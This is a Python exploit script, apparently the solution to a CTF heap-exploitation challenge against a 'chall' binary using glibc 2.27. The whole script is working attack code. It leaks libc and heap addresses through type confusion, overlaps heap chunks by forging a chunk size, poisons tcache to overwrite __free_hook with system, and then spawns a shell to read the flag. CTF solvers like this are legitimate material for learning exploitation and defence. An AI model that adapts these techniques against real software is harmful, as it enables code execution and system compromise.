from ptrlib import *
import os

def set(index, type, data):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", str(type))
    if isinstance(data, bytes):
        sock.sendlineafter(": ", data)
    else:
        sock.sendlineafter(": ", str(data))

def show():
    sock.sendlineafter("> ", "2")
    sock.recvline()
    l = []
    for i in range(10):
        r = sock.recvline()
        if b'undefined' in r:
            l.append(None)
        else:
            l.append(r[r.index(b'] ')+2:])
    return l

def delete(index):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter(": ", str(index))

HOST = os.getenv("HOST", "0.0.0.0")
PORT = os.getenv("PORT", "9005")

elf = ELF("../distfiles/chall")
#libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#sock = Process("../distfiles/chall")
libc = ELF("../distfiles/libc-2.27.so")

for j in range(3):
    sock = Socket(HOST, int(PORT))

    # libc & heap leak
    set(0, 2, u64(p64(elf.got('puts')), type=float))
    set(1, 2, u64(p64(elf.symbol('list') + 0x10), type=float))
    set(2, 1, b"A"*0x40 + p64(0) + p64(0x81))
    set(3, 1, "B" * 0x10)
    result = show()
    libc_base = u64(result[0][1:-1]) - libc.symbol('puts')
    heap_base = u64(result[1][1:-1]) - 0x260
    logger.info("libc = " + hex(libc_base))
    logger.info("heap = " + hex(heap_base))

    # overlap chunk
    delete(3)
    set(3, 2, u64(p64(heap_base + 0x2b0), type=float))
    delete(3)
    payload  = b"C" * 0x20
    payload += p64(0) + p64(0x91) # change chunk size!
    payload += p64(libc_base + libc.symbol('__free_hook'))
    set(3, 1, payload)

    # overwrite __free_hook
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", p64(libc_base + libc.symbol('system')))
    sock.sendlineafter("): ", "/bin/sh\0")

    sock.sendline("cat flag*")
    print(sock.recvline())

    sock.close()
